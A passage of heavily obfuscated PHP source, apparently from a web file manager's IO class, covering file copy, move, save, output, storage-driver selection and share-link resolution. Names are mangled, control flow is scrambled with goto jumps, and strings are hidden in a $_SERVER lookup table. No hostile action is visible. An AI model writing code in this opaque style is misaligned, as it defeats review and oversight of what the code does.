$aàπ†¿µπ™ = self::driverMake($b‹û´°ü◊û[0]); if (method_exists($aàπ†¿µπ™, $aç‚á§πΩµ)) { return @call_user_func_array(array($aàπ†¿µπ™, $aç‚á§πΩµ), $b‹û´°ü◊û); } if (method_exists($aàπ†¿µπ™, $_SERVER[—Ω][1001])) { return @call_user_func_array(array($aàπ†¿µπ™, $aç‚á§πΩµ), $b‹û´°ü◊û); } else { if (method_exists(self, $aç‚á§πΩµ)) { return @call_user_func_array(array(self, $aç‚á§πΩµ), $b‹û´°ü◊û); } else { call_user_func_array(array(parent, $aç‚á§πΩµ), $b‹û´°ü◊û); } } } public static function init($A£å©çœãõ) { return self::driverMake($A£å©çœãõ); } public static function copy($CÑ∆ôì±áà, $A¶”ßÛëêÃ, $CÀ∑ëÿñÃ≥ = false, $CÃ—ﬂ“…Ú = false) { return self::copyMove($CÑ∆ôì±áà, $A¶”ßÛëêÃ, $CÀ∑ëÿñÃ≥, $_SERVER[—Ω][486], $CÃ—ﬂ“…Ú); } public static function move($f¡Ω¢’–’Ò, $a◊≥⁄ßÏ¢ó, $Eêóê‰Ü§µ = false, $E◊•Ï€Áª = false) { return self::copyMove($f¡Ω¢’–’Ò, $a◊≥⁄ßÏ¢ó, $Eêóê‰Ü§µ, $_SERVER[—Ω][488], $E◊•Ï€Áª); } public static function saveFile($c∞–µìë‚, $B÷Í†ïÕíõ, $F…‰À‰—‚º = true) { goto cÓÓø®™éé; bòÆ◊ Î≤∞: $bÎ„Ûà¥ˆø = self::copyFile($cåÀÚÌ»ÚÂ, $c∞–µìë‚, $fëø”·≥óë, $Bñ“£çÍôö, $Eá≤Èﬁ∫ƒ∞[$E©…åÜ®çﬁ[28]], $CÁ¢¢Õ–‰Æ); if ($C‰àΩ·œÜç) { $bÎ„Ûà¥ˆø = $C‰àΩ·œÜç->getPathOuter($bÎ„Ûà¥ˆø); } return $bÎ„Ûà¥ˆø; goto C˜‰◊üƒñ»; Fö‘Ó∞ã¬Ë: $fëø”·≥óë = self::driverMake($B÷Í†ïÕíõ); $C‰àΩ·œÜç = !1; if ($fëø”·≥óë->pathParse[$E©…åÜ®çﬁ[1002]]) { $f›¢àÃìµŸ = $fëø”·≥óë->pathParse[$E©…åÜ®çﬁ[1002]]; $C‰àΩ·œÜç = $fëø”·≥óë; $fëø”·≥óë = self::driverMake($f›¢àÃìµŸ); } goto FÜ‹ì≠ê¥»; cÓÓø®™éé: $E©…åÜ®çﬁ =& $_SERVER[—Ω]; $Eá≤Èﬁ∫ƒ∞ = self::info($B÷Í†ïÕíõ); $cåÀÚÌ»ÚÂ = self::driverMake($c∞–µìë‚); goto Fö‘Ó∞ã¬Ë; FÜ‹ì≠ê¥»: $Bñ“£çÍôö = $fëø”·≥óë->pathFather($B÷Í†ïÕíõ); $CÁ¢¢Õ–‰Æ = !0; if (!$F…‰À‰—‚º && self::driverIsSame($cåÀÚÌ»ÚÂ, $fëø”·≥óë)) { $CÁ¢¢Õ–‰Æ = !1; } goto bòÆ◊ Î≤∞; C˜‰◊üƒñ»: } private static function copyMove($Dì∞ï√≈¬, $EÍﬁÍÙºﬂì, $AâÇû—›òŒ, $cƒå£…ÆÚã, $f€§ßÕ±ñì = false) { goto EÕ˜„ò¯›‚; f¢ÊÃ¿≈ÿ∫: if ($D©ÂØ¢ﬁ¥£) { $d∑Æ±À÷Öú = $D©ÂØ¢ﬁ¥£->getPathOuter($d∑Æ±À÷Öú); } return $d∑Æ±À÷Öú; goto Eÿ÷ÛÆ£ºÏ; d‚√‹óù¢É: $B¡√ı…ÜéÚ = $AÎäÉ«¬øÖ->isFile($Dì∞ï√≈¬); if (!$B¡√ı…ÜéÚ && $bÖèµ“Á†Í->getType() == $d⁄‹£èç∞Ú[704] && $AÎäÉ«¬øÖ->getType() == $d⁄‹£èç∞Ú[103]) { $d∑Æ±À÷Öú = $bÖèµ“Á†Í->copyFolderFromIO($AÎäÉ«¬øÖ, $Dì∞ï√≈¬, $EÍﬁÍÙºﬂì, $AâÇû—›òŒ, $C¢œå∆î‚∏, $f€§ßÕ±ñì); } else { $d∑Æ±À÷Öú = self::copyPath($AÎäÉ«¬øÖ, $Dì∞ï√≈¬, $bÖèµ“Á†Í, $EÍﬁÍÙºﬂì, $AâÇû—›òŒ, $C¢œå∆î‚∏, $B¡√ı…ÜéÚ, $f€§ßÕ±ñì); } if ($d∑Æ±À÷Öú && $C¢œå∆î‚∏) { $AÎäÉ«¬øÖ->remove($Dì∞ï√≈¬); } goto f¢ÊÃ¿≈ÿ∫; eÜåä„Ñ”°: Hook::trigger($d⁄‹£èç∞Ú[72], $AÎäÉ«¬øÖ, $Dì∞ï√≈¬, $bÖèµ“Á†Í, $EÍﬁÍÙºﬂì); $C∂∏⁄ƒûäÉ = self::driverIsSame($AÎäÉ«¬øÖ, $bÖèµ“Á†Í); if ($C∂∏⁄ƒûäÉ) { if ($cƒå£…ÆÚã == $d⁄‹£èç∞Ú[488] && trim($EÍﬁÍÙºﬂì, $d⁄‹£èç∞Ú[8]) == trim($bÖèµ“Á†Í->pathFather($Dì∞ï√≈¬), $d⁄‹£èç∞Ú[8])) { return $bÖèµ“Á†Í->getPathOuter($Dì∞ï√≈¬); } if (method_exists($bÖèµ“Á†Í, $cƒå£…ÆÚã)) { return $bÖèµ“Á†Í->{$cƒå£…ÆÚã}($Dì∞ï√≈¬, $EÍﬁÍÙºﬂì, $AâÇû—›òŒ); } } goto d‚√‹óù¢É; E≤ñÙ‚Ó≤Û: $AÎäÉ«¬øÖ = self::driverMake($Dì∞ï√≈¬); $bÖèµ“Á†Í = self::driverMake($EÍﬁÍÙºﬂì); $C¢œå∆î‚∏ = $cƒå£…ÆÚã == $d⁄‹£èç∞Ú[488]; goto bﬁÚÓÒÑäÚ; bﬁÚÓÒÑäÚ: $D©ÂØ¢ﬁ¥£ = !1; if ($bÖèµ“Á†Í->pathParse[$d⁄‹£èç∞Ú[1002]]) { $EÍﬁÍÙºﬂì = $bÖèµ“Á†Í->pathParse[$d⁄‹£èç∞Ú[1002]]; $D©ÂØ¢ﬁ¥£ = $bÖèµ“Á†Í; $bÖèµ“Á†Í = self::driverMake($EÍﬁÍÙºﬂì); } self::check($AÎäÉ«¬øÖ, $Dì∞ï√≈¬, $bÖèµ“Á†Í, $EÍﬁÍÙºﬂì); goto eÜåä„Ñ”°; EÕ˜„ò¯›‚: $d⁄‹£èç∞Ú =& $_SERVER[—Ω]; if (!$Dì∞ï√≈¬ || $Dì∞ï√≈¬ == $d⁄‹£èç∞Ú[8] || !$EÍﬁÍÙºﬂì) { return !1; } ignore_timeout(); goto E≤ñÙ‚Ó≤Û; Eÿ÷ÛÆ£ºÏ: } private static function check($BÂ¨Ö«·ú, $EçºŒ’†ﬂ, $f›Ÿ¥Óûè°, &$bÓÊ∫ëÀ£â) { $déìÍªëÌ =& $_SERVER[—Ω]; if (self::driverIsSame($BÂ¨Ö«·ú, $f›Ÿ¥Óûè°) && $BÂ¨Ö«·ú->isFolder($EçºŒ’†ﬂ) && $BÂ¨Ö«·ú->isParentOf($EçºŒ’†ﬂ, $bÓÊ∫ëÀ£â)) { show_json(LNG($déìÍªëÌ[1003]), !1); } if (!$BÂ¨Ö«·ú->exist($EçºŒ’†ﬂ)) { show_json(LNG($déìÍªëÌ[102]), !1); } } private static function copyPath($aÏô’çÒË∂, $c∫…‰ƒ˘È–, $aı±⁄óÃà›, $f≈ÖÓ§èƒ¬, $A§£–±∑™‚, $a‘©⁄≠πÔ—, $aèµ°‡›ÏÑ, $b™Ù´‰ÈË¿ = false) { goto DäÃÍÑƒÿÕ; CóæØ∆πËÜ: $f«å“õ…˘› = array_merge($cäÒˆ£˘ñµ[$bÔÿÃÊ≤â°[73]], $cäÒˆ£˘ñµ[$bÔÿÃÊ≤â°[74]]); foreach ($f«å“õ…˘› as $d¥Õ≥¡ÉÉ) { $D≥†ŒÍµ•ø = $d¥Õ≥¡ÉÉ[$bÔÿÃÊ≤â°[29]] == $bÔÿÃÊ≤â°[164]; $c∫…‰ƒ˘È– = $aÏô’çÒË∂->getPathInner($d¥Õ≥¡ÉÉ[$bÔÿÃÊ≤â°[75]]); $DÂ‡ı¶€ª® = self::copyPath($aÏô’çÒË∂, $c∫…‰ƒ˘È–, $aı±⁄óÃà›, $f≈ÖÓ§èƒ¬, $A§£–±∑™‚, $a‘©⁄≠πÔ—, $D≥†ŒÍµ•ø); if (!$DÂ‡ı¶€ª®) { write_log($bÔÿÃÊ≤â°[1004] . $c∫…‰ƒ˘È– . $bÔÿÃÊ≤â°[1005] . $f≈ÖÓ§èƒ¬, $bÔÿÃÊ≤â°[1006]); } } return $CçÃ‰µπ«; goto A¢áúÖ⁄ê∆; D”àÜ‚˘ô◊: if ($aèµ°‡›ÏÑ) { return self::copyFile($aÏô’çÒË∂, $c∫…‰ƒ˘È–, $aı±⁄óÃà›, $f≈ÖÓ§èƒ¬, $cÎÉ≠»€¶ñ, $a‘©⁄≠πÔ—); } if ($A§£–±∑™‚ == REPEAT_RENAME_FOLDER) { $A§£–±∑™‚ = !1; } $e∞¶ñä÷¶í = rtrim($f≈ÖÓ§èƒ¬, $bÔÿÃÊ≤â°[8]) . $bÔÿÃÊ≤â°[8] . $cÎÉ≠»€¶ñ; goto Bó–ŸÓ®É°; Bó–ŸÓ®É°: $CçÃ‰µπ« = $aı±⁄óÃà›->mkdir($aı±⁄óÃà›->getPath($e∞¶ñä÷¶í)); $f≈ÖÓ§èƒ¬ = $aı±⁄óÃà›->getPathInner($CçÃ‰µπ«); $cäÒˆ£˘ñµ = $aÏô’çÒË∂->listPath($c∫…‰ƒ˘È–, !0); goto CóæØ∆πËÜ; DäÃÍÑƒÿÕ: $bÔÿÃÊ≤â° =& $_SERVER[—Ω]; $cÎÉ≠»€¶ñ = $b™Ù´‰ÈË¿ ? $b™Ù´‰ÈË¿ : $aÏô’çÒË∂->getPathName($aÏô’çÒË∂->pathThis($c∫…‰ƒ˘È–)); if ($A§£–±∑™‚) { $Eì–∑ê∫⁄Í = $aı±⁄óÃà›->fileNameExist($f≈ÖÓ§èƒ¬, $cÎÉ≠»€¶ñ); $cÎÉ≠»€¶ñ = $aı±⁄óÃà›->fileNameAuto($f≈ÖÓ§èƒ¬, $cÎÉ≠»€¶ñ, $A§£–±∑™‚, !$aèµ°‡›ÏÑ); $A§£–±∑™‚ = $Eì–∑ê∫⁄Í ? $A§£–±∑™‚ : !1; } goto D”àÜ‚˘ô◊; A¢áúÖ⁄ê∆: } private static function copyFile($A°«úÿìï , $d•€ãÇ„∞Ü, $F‘‡Û‚€ó∆, $e¨Áöí£–ƒ, $AÜàäøË‡µ, $EùŸˆ…Õ¡¶) { goto B¶Ω◊óæ±Œ; dÌ‡Ÿè…ô≤: Hook::trigger($F´–áÿ¥Ñè[1008], $A°«úÿìï , $d•€ãÇ„∞Ü, $F‘‡Û‚€ó∆, $e¨Áöí£–ƒ, $AÜàäøË‡µ, $B¡•»—öãø); if (self::driverIsSame($A°«úÿìï , $F‘‡Û‚€ó∆)) { if ($EùŸˆ…Õ¡¶) { $D ªùÿﬁ‚¨ = $F‘‡Û‚€ó∆->moveFile($d•€ãÇ„∞Ü, $e¨Áöí£–ƒ); } else { $D ªùÿﬁ‚¨ = $F‘‡Û‚€ó∆->copyFile($d•€ãÇ„∞Ü, $e¨Áöí£–ƒ); } Hook::trigger($F´–áÿ¥Ñè[1009], $A°«úÿìï , $d•€ãÇ„∞Ü, $F‘‡Û‚€ó∆, $e¨Áöí£–ƒ, $AÜàäøË‡µ, $D ªùÿﬁ‚¨); return $D ªùÿﬁ‚¨; } $D◊äﬂÀÃªÃ = TEMP_FILES; goto dà€ﬂÂ°ßã; B¶Ω◊óæ±Œ: $F´–áÿ¥Ñè =& $_SERVER[—Ω]; $e¨Áöí£–ƒ = $F‘‡Û‚€ó∆->getPath(rtrim($e¨Áöí£–ƒ, $F´–áÿ¥Ñè[8]) . $F´–áÿ¥Ñè[8] . $AÜàäøË‡µ); $B¡•»—öãø = $F´–áÿ¥Ñè[1007] . time() . rand_string(5); goto dÌ‡Ÿè…ô≤; B≤π‡Ù‡˘ç: Hook::trigger($F´–áÿ¥Ñè[1009], $A°«úÿìï , $d•€ãÇ„∞Ü, $F‘‡Û‚€ó∆, $e¨Áöí£–ƒ, $AÜàäøË‡µ, $D ªùÿﬁ‚¨); return $D ªùÿﬁ‚¨; goto b»œáæÎÔ‹; dà€ﬂÂ°ßã: mk_dir($D◊äﬂÀÃªÃ); $Eïâ≤ÉÎä = $D◊äﬂÀÃªÃ . $B¡•»—öãø; $Eïâ≤ÉÎä = $A°«úÿìï ->download($d•€ãÇ„∞Ü, $Eïâ≤ÉÎä); goto eÀœÖüß≠É; eÀœÖüß≠É: $Eïâ≤ÉÎä = $A°«úÿìï ->iconvApp($Eïâ≤ÉÎä); $D ªùÿﬁ‚¨ = $F‘‡Û‚€ó∆->upload($e¨Áöí£–ƒ, $Eïâ≤ÉÎä, $EùŸˆ…Õ¡¶); self::remove($D◊äﬂÀÃªÃ . $B¡•»—öãø); goto B≤π‡Ù‡˘ç; b»œáæÎÔ‹: } public static function pathFather($aâœ•øú˘⁄) { $Fàâ±Ÿ’≥ç = IO::init($aâœ•øú˘⁄); $F£∫∏À–Óì = $Fàâ±Ÿ’≥ç->pathFather($Fàâ±Ÿ’≥ç->path); return $Fàâ±Ÿ’≥ç->getPathOuter($F£∫∏À–Óì); } public static function fileOut($A·»Ì≥‹®£, $cÉﬁ‚ÒÜÈı = false, $B∫ ¬·åúü = false, $d„ÚÈ¿É∫ﬂ = '') { $AÜƒ˜û±˘≠ = self::driverMake($A·»Ì≥‹®£); if ($AÜƒ˜û±˘≠->isFileOutServer()) { return $AÜƒ˜û±˘≠->fileOutServer($A·»Ì≥‹®£, $cÉﬁ‚ÒÜÈı, $B∫ ¬·åúü, $d„ÚÈ¿É∫ﬂ); } return $AÜƒ˜û±˘≠->fileOut($A·»Ì≥‹®£, $cÉﬁ‚ÒÜÈı, $B∫ ¬·åúü, $d„ÚÈ¿É∫ﬂ); } public static function fileOutImage($Cπ™ÊÕàÛ„, $fËôé◊ı—≤ = 250) { $cêèÀÕ¿âù = array(250, 600, 1200, 3000); for ($BÇ∫°ìÊØ = 0; $BÇ∫°ìÊØ < count($cêèÀÕ¿âù); $BÇ∫°ìÊØ++) { if ($BÇ∫°ìÊØ == 0 && $fËôé◊ı—≤ <= $cêèÀÕ¿âù[$BÇ∫°ìÊØ]) { $fËôé◊ı—≤ = $cêèÀÕ¿âù[$BÇ∫°ìÊØ]; break; } else { if ($fËôé◊ı—≤ > $cêèÀÕ¿âù[$BÇ∫°ìÊØ - 1] && $fËôé◊ı—≤ <= $cêèÀÕ¿âù[$BÇ∫°ìÊØ]) { $fËôé◊ı—≤ = $cêèÀÕ¿âù[$BÇ∫°ìÊØ]; break; } else { if ($BÇ∫°ìÊØ == count($cêèÀÕ¿âù) - 1 && $fËôé◊ı—≤ > $cêèÀÕ¿âù[$BÇ∫°ìÊØ]) { $fËôé◊ı—≤ = $cêèÀÕ¿âù[$BÇ∫°ìÊØ]; break; } } } } $aèÖÇàëÇ‰ = self::driverMake($Cπ™ÊÕàÛ„); if ($aèÖÇàëÇ‰->isFileOutServer()) { return $aèÖÇàëÇ‰->fileOutImageServer($Cπ™ÊÕàÛ„, $fËôé◊ı—≤); } return $aèÖÇàëÇ‰->fileOutImage($Cπ™ÊÕàÛ„, $fËôé◊ı—≤); } private static function driverIsSame($e⁄‚ê©ÓÉ§, $aﬂ±Ü‰Ôã‰) { goto eî¨ÌâÚ∆¿; eî¨ÌâÚ∆¿: $a†É«Ñå„È =& $_SERVER[—Ω]; $c∂∂ëÌ°Ã‚ = $e⁄‚ê©ÓÉ§->getType(); $fπñ›óﬁ•‚ = $aﬂ±Ü‰Ôã‰->getType(); goto AΩÇŸ∑•¡é; AΩÇŸ∑•¡é: if ($c∂∂ëÌ°Ã‚ != $fπñ›óﬁ•‚) { return !1; } if ($c∂∂ëÌ°Ã‚ == $a†É«Ñå„È[704]) { return !0; } if ($c∂∂ëÌ°Ã‚ == $a†É«Ñå„È[103]) { return !0; } goto d˜Ü¿ïõ™Á; d˜Ü¿ïõ™Á: if ($e⁄‚ê©ÓÉ§->pathDriver == $aﬂ±Ü‰Ôã‰->pathDriver) { return !0; } return !1; goto cÓôçÃËºä; cÓôçÃËºä: } public static function copyUpdate($EáÇñ∂¢˜ú, $F‰ûÛ§Ò¨ç) { goto A¡Û¡πîÖ√; Aéﬁîöá˜§: $d°¥©ÏóôÁ = self::_listAll($EáÇñ∂¢˜ú); $A´ú∏–Ê§– = self::_listAll($F‰ûÛ§Ò¨ç); $F’øôà‘Ÿ = array(); goto BÈ—¢ô”ûÕ; dœöÏ…Òç»: Hook::trigger($F≥ö€ŸÃºé[1013], $EáÇñ∂¢˜ú, $F‰ûÛ§Ò¨ç, $FèéË©¡”Œ); foreach ($Eîπ¨¢£µÓ as $fÆŸó∑ÂÈì) { IO::mkdir($fÆŸó∑ÂÈì); } foreach ($F’øôà‘Ÿ as $fÆŸó∑ÂÈì) { IO::copy($fÆŸó∑ÂÈì[$F≥ö€ŸÃºé[1010]], $fÆŸó∑ÂÈì[$F≥ö€ŸÃºé[1011]], REPEAT_REPLACE); } goto a¿ÿ˘´≈íü; BÈ—¢ô”ûÕ: $Eîπ¨¢£µÓ = array(); foreach ($d°¥©ÏóôÁ as $DÇ¶÷ûíÿ‰ => $fÆŸó∑ÂÈì) { if (isset($A´ú∏–Ê§–[$DÇ¶÷ûíÿ‰])) { if ($fÆŸó∑ÂÈì[$F≥ö€ŸÃºé[76]] == 1) { continue; } if ($A´ú∏–Ê§–[$DÇ¶÷ûíÿ‰][$F≥ö€ŸÃºé[77]] == $fÆŸó∑ÂÈì[$F≥ö€ŸÃºé[77]]) { continue; } } if ($fÆŸó∑ÂÈì[$F≥ö€ŸÃºé[76]] == 1) { $Eîπ¨¢£µÓ[] = $F‰ûÛ§Ò¨ç . $F≥ö€ŸÃºé[8] . $DÇ¶÷ûíÿ‰; continue; } $Cˆç¯ÒçÉ∆ = strstr(trim($DÇ¶÷ûíÿ‰, $F≥ö€ŸÃºé[8]), $F≥ö€ŸÃºé[8]) ? get_path_father($DÇ¶÷ûíÿ‰) : $F≥ö€ŸÃºé[33]; $F’øôà‘Ÿ[] = array($F≥ö€ŸÃºé[1010] => $fÆŸó∑ÂÈì[$F≥ö€ŸÃºé[75]], $F≥ö€ŸÃºé[1011] => rtrim($F‰ûÛ§Ò¨ç, $F≥ö€ŸÃºé[8]) . $F≥ö€ŸÃºé[8] . $Cˆç¯ÒçÉ∆, $F≥ö€ŸÃºé[1012] => $fÆŸó∑ÂÈì); } $FèéË©¡”Œ = array($F≥ö€ŸÃºé[164] => $F’øôà‘Ÿ, $F≥ö€ŸÃºé[76] => $Eîπ¨¢£µÓ); goto dœöÏ…Òç»; A¡Û¡πîÖ√: $F≥ö€ŸÃºé =& $_SERVER[—Ω]; if (!IO::exist($EáÇñ∂¢˜ú)) { return !1; } if (!IO::exist($F‰ûÛ§Ò¨ç)) { IO::mkdir($F‰ûÛ§Ò¨ç); } goto Aéﬁîöá˜§; a¿ÿ˘´≈íü: } private static function _listAll($dó≠çòõ”«) { $Eƒƒæ∫∫ Ñ =& $_SERVER[—Ω]; $dó≠çòõ”« = KodIO::clear($dó≠çòõ”«); $BÖŸŒÑÛî∫ = IO::listAll($dó≠çòõ”«); foreach ($BÖŸŒÑÛî∫ as &$fÍ¯ñ‡ƒÙÿ) { $EÇ¬Ù‚∏£ˆ = substr($fÍ¯ñ‡ƒÙÿ[$Eƒƒæ∫∫ Ñ[75]], strlen($dó≠çòõ”«)); $fÍ¯ñ‡ƒÙÿ[$Eƒƒæ∫∫ Ñ[1014]] = trim($EÇ¬Ù‚∏£ˆ, $Eƒƒæ∫∫ Ñ[8]); } return array_to_keyvalue($BÖŸŒÑÛî∫, $Eƒƒæ∫∫ Ñ[1014]); } public static function fileSubstr($cüçƒÓç—‚, $A–‘’≈û¿≤, $Bõä´ååå = false) { goto dûåÀ˜‡¥–; fΩÒãßÚÑ“: return $eﬂ˘Ñ°≤ﬁç->fileSubstr($cüçƒÓç—‚, $A–‘’≈û¿≤, $Bõä´ååå); goto A‘—ŸÖ∑†—; dûåÀ˜‡¥–: $eﬂ˘Ñ°≤ﬁç = self::driverMake($cüçƒÓç—‚); $e¬ı óﬁÂ = $eﬂ˘Ñ°≤ﬁç->size($cüçƒÓç—‚); $Dêê∏„›‘∆ = $A–‘’≈û¿≤; goto còó≈Œ›Èç; c∏Ãìåíœ¿: if ($A–‘’≈û¿≤ + $Bõä´ååå > $e¬ı óﬁÂ) { $Bõä´ååå = $e¬ı óﬁÂ - $A–‘’≈û¿≤; } if ($Bõä´ååå <= 0) { return $_SERVER[—Ω][33]; } if ($A–‘’≈û¿≤ < 0 || $A–‘’≈û¿≤ >= $e¬ı óﬁÂ || $Bõä´ååå > 1024 * 1024 * 5) { throw new Exception("\146\151\x6c\145\x52\x65\x61\x64\40\x65\x72\162\x6f\x72\x21\x20\163\x74\141\x72\x74\x3d{$A–‘’≈û¿≤}\x3b\154\x65\x6e\x67\x74\150\75{$Bõä´ååå}\73\x20\x73\x69\x7a\145\x3d{$e¬ı óﬁÂ}\x3b"); } goto fΩÒãßÚÑ“; còó≈Œ›Èç: $B‚÷Üﬂÿãß = $Bõä´ååå; if ($A–‘’≈û¿≤ < 0) { $A–‘’≈û¿≤ = $e¬ı óﬁÂ + $A–‘’≈û¿≤; } if ($Bõä´ååå === !1) { $Bõä´ååå = $e¬ı óﬁÂ - $A–‘’≈û¿≤; } goto c∏Ãìåíœ¿; A‘—ŸÖ∑†—: } private static function driverMake(&$bµ…∑Ö´Ÿá) { goto BÌÑ©®ı¬; B›‘ç´ê‹ë: if ($FøÉŸπ›¬ó[$A‘Ì‹«ãÓè[29]] == KodIO::KOD_IO && !self::$driverListSystem[$FøÉŸπ›¬ó[$A‘Ì‹«ãÓè[364]]]) { return !1; } $bµ…∑Ö´Ÿá = $FøÉŸπ›¬ó[$A‘Ì‹«ãÓè[1015]]; $FèèÀãÑ‰æ = self::driverGet($FøÉŸπ›¬ó, $bµ…∑Ö´Ÿá); goto AâØœë⁄á‘; BÌÑ©®ı¬: $A‘Ì‹«ãÓè =& $_SERVER[—Ω]; $FøÉŸπ›¬ó = KodIO::parse($bµ…∑Ö´Ÿá); if (!self::$driverListSystem) { $C”ÏÜ±Îô‹ = Model($A‘Ì‹«ãÓè[714])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($C”ÏÜ±Îô‹, $A‘Ì‹«ãÓè[364]); } goto B›‘ç´ê‹ë; AâØœë⁄á‘: return $FèèÀãÑ‰æ; goto eè¿‡à∑ˆè; eè¿‡à∑ˆè: } private static function driverGet($b∫ÚÕâÿÎÁ, &$b∏ª€ÚÔı†) { goto D¥œ…∂Ó™Œ; bπç»≠ëÛø: if (isset($B≥¿åÖ¯ﬁÉ[$f‡√ÑÚ¨˜ã[6]][$f‡√ÑÚ¨˜ã[1028]])) { $a°„Èâ√‹¨->pathBase = rtrim($B≥¿åÖ¯ﬁÉ[$f‡√ÑÚ¨˜ã[6]][$f‡√ÑÚ¨˜ã[1028]], $f‡√ÑÚ¨˜ã[8]) . $f‡√ÑÚ¨˜ã[8]; $b∏ª€ÚÔı† = $a°„Èâ√‹¨->pathBase . ltrim($b∏ª€ÚÔı†, $f‡√ÑÚ¨˜ã[8]); } $b∏ª€ÚÔı† = $a°„Èâ√‹¨->getPath($b∏ª€ÚÔı†); if (isset($b∫ÚÕâÿÎÁ[$f‡√ÑÚ¨˜ã[1002]])) { $b∏ª€ÚÔı† = $b∫ÚÕâÿÎÁ[$f‡√ÑÚ¨˜ã[1002]]; } goto bà“ˆª◊Öº; e£åôÒ†⁄Î: $a°„Èâ√‹¨ = self::$driverCache[$F´ºÏ≥ ˜¶]; $a°„Èâ√‹¨->pathDriver = $f°Á‹úù÷á; $a°„Èâ√‹¨->pathBase = $f‡√ÑÚ¨˜ã[33]; goto bπç»≠ëÛø; dÛ•›©∑†è: switch ($b∫ÚÕâÿÎÁ[$f‡√ÑÚ¨˜ã[29]]) { case KodIO::KOD_IO: $B≥¿åÖ¯ﬁÉ = self::$driverListSystem[$açÀûéÒ¢Œ]; break; case KodIO::KOD_SOURCE: $b∏ª€ÚÔı† = $açÀûéÒ¢Œ . $b∏ª€ÚÔı†; $B≥¿åÖ¯ﬁÉ = array($f‡√ÑÚ¨˜ã[1017] => $f‡√ÑÚ¨˜ã[1018], $f‡√ÑÚ¨˜ã[6] => $b∫ÚÕâÿÎÁ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $cä‘éü∫·Ì = $GLOBALS[$f‡√ÑÚ¨˜ã[1019]]; self::$driverListUser = array_to_keyvalue($cä‘éü∫·Ì, $f‡√ÑÚ¨˜ã[364]); } $B≥¿åÖ¯ﬁÉ = self::$driverListUser[$açÀûéÒ¢Œ]; break; case KodIO::KOD_SHARE_LINK: $B≥¿åÖ¯ﬁÉ = array($f‡√ÑÚ¨˜ã[1017] => $f‡√ÑÚ¨˜ã[1020], $f‡√ÑÚ¨˜ã[6] => $b∫ÚÕâÿÎÁ); $Eù≥Ö˜´†ä = Action($f‡√ÑÚ¨˜ã[1021])->sharePathInfo($b∫ÚÕâÿÎÁ[$f‡√ÑÚ¨˜ã[75]]); $b∏ª€ÚÔı† = $Eù≥Ö˜´†ä[$f‡√ÑÚ¨˜ã[366]]; if (!$Eù≥Ö˜´†ä[$f‡√ÑÚ¨˜ã[366]]) { $fÈä˘èÁ¢¶ = Model($f‡√ÑÚ¨˜ã[532])->getInfo($Eù≥Ö˜´†ä[$f‡√ÑÚ¨˜ã[437]]); $b∏ª€ÚÔı† = KodIO::clear($fÈä˘èÁ¢¶[$f‡√ÑÚ¨˜ã[1022]] . $b∫ÚÕâÿÎÁ[$f‡√ÑÚ¨˜ã[1015]]); $b∫ÚÕâÿÎÁ[$f‡√ÑÚ¨˜ã[435]] = $fÈä˘èÁ¢¶; $b∫ÚÕâÿÎÁ[$f‡√ÑÚ¨˜ã[1002]] = $b∏ª€ÚÔı†; $B≥¿åÖ¯ﬁÉ = array($f‡√ÑÚ¨˜ã[1017] => $f‡√ÑÚ¨˜ã[1023], $f‡√ÑÚ¨˜ã[6] => $b∫ÚÕâÿÎÁ); } break; case KodIO::KOD_SHARE_ITEM: $B≥¿åÖ¯ﬁÉ = array($f‡√ÑÚ¨˜ã[1017] => $f‡√ÑÚ¨˜ã[1024], $f‡√ÑÚ¨˜ã[6] => $b∫ÚÕâÿÎÁ); $fÈä˘èÁ¢¶ = Model($f‡√ÑÚ¨˜ã[532])->getInfo($b∫ÚÕâÿÎÁ[$f‡√ÑÚ¨˜ã[364]]); if ($fÈä˘èÁ¢¶[$f‡√ÑÚ¨˜ã[366]] == $f‡√ÑÚ¨˜ã[464]) { $b∏ª€ÚÔı† = KodIO::clear($fÈä˘èÁ¢¶[$f‡√ÑÚ¨˜ã[1022]] . $b∫ÚÕâÿÎÁ[$f‡√ÑÚ¨˜ã[1015]]); $b∫ÚÕâÿÎÁ[$f‡√ÑÚ¨˜ã[435]] = $fÈä˘èÁ¢¶; $b∫ÚÕâÿÎÁ[$f‡√ÑÚ¨˜ã[1002]] = $b∏ª€ÚÔı†; $B≥¿åÖ¯ﬁÉ = array($f‡√ÑÚ¨˜ã[1017] => $f‡√ÑÚ¨˜ã[1025], $f‡√ÑÚ¨˜ã[6] => $b∫ÚÕâÿÎÁ); } break; default: $b∏ª€ÚÔı† = $b∫ÚÕâÿÎÁ[$f‡√ÑÚ¨˜ã[75]]; $B≥¿åÖ¯ﬁÉ = array($f‡√ÑÚ¨˜ã[1017] => $f‡√ÑÚ¨˜ã[1026]); break; } $F´ºÏ≥ ˜¶ = $b∫ÚÕâÿÎÁ[$f‡√ÑÚ¨˜ã[75]]; if (!isset(self::$driverCache[$F´ºÏ≥ ˜¶])) { $fÜÃÕä´äá = strtolower($B≥¿åÖ¯ﬁÉ[$f‡√ÑÚ¨˜ã[90]]); $Cõ‰¨ü∏£ = $GLOBALS[$f‡√ÑÚ¨˜ã[6]][$f‡√ÑÚ¨˜ã[84]][$f‡√ÑÚ¨˜ã[1027]]; $b˜‚ÚëÊ®ø = $f‡√ÑÚ¨˜ã[71] . (isset($Cõ‰¨ü∏£[$fÜÃÕä´äá]) ? $Cõ‰¨ü∏£[$fÜÃÕä´äá] : ucfirst($fÜÃÕä´äá)); if (!class_exists($b˜‚ÚëÊ®ø)) { show_json("{$b˜‚ÚëÊ®ø}\x20\156\x6f\x74\40\x65\170\151\x73\x74\163\41", !1); } $bÇ≠ÖÎãΩ« = isset($B≥¿åÖ¯ﬁÉ[$f‡√ÑÚ¨˜ã[6]]) ? $B≥¿åÖ¯ﬁÉ[$f‡√ÑÚ¨˜ã[6]] : !1; self::$driverCache[$F´ºÏ≥ ˜¶] = new $b˜‚ÚëÊ®ø($bÇ≠ÖÎãΩ«); } goto e£åôÒ†⁄Î; D¥œ…∂Ó™Œ: $f‡√ÑÚ¨˜ã =& $_SERVER[—Ω]; $f°Á‹úù÷á = $b∫ÚÕâÿÎÁ[$f‡√ÑÚ¨˜ã[1016]]; $açÀûéÒ¢Œ = $b∫ÚÕâÿÎÁ[$f‡√ÑÚ¨˜ã[364]]; goto dÛ•›©∑†è; bà“ˆª◊Öº: $a°„Èâ√‹¨->path = $b∏ª€ÚÔı†; return $a°„Èâ√‹¨; goto bÌ±Ó€Ü¨Ø; bÌ±Ó€Ü¨Ø: } } goto A‹èÖ„ˆ‚ï; e·ç¿ôÁå√: class BackupDbFile { public function 